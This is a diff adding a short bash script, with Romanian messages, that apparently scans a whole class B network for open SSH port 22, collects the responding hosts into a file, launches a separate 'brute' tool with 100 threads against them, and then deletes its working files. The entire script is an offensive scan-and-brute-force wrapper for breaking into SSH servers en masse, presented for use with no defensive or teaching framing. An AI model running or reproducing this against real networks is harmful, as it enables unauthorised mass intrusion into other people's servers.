@@ -1,0 +1,22 @@
+#!/bin/bash
+if [ -f ip.conf ]; then
+rm -f ip.conf 1>/dev/null 2>/dev/null
+fi
+if [ $# != 1 ]; then
+        echo "# usage: $0 <b class>"
+        exit;
+fi
+
+
+
+echo "# Scanam $1 pe port 22"
+./scan $1 22 
+
+sleep 10
+cat $1.pscan.22 |sort |uniq > ip.conf
+oopsnr2=`grep -c . ip.conf`
+echo "# Am gasit $oopsnr2 servere."
+echo "----------------------------------------"
+./brute 100
+rm -rf $1.pscan.22 ip.conf 1>/dev/null 2>/dev/null
+echo "# Bahhh incearca alt ip ca asta e de-an polea."
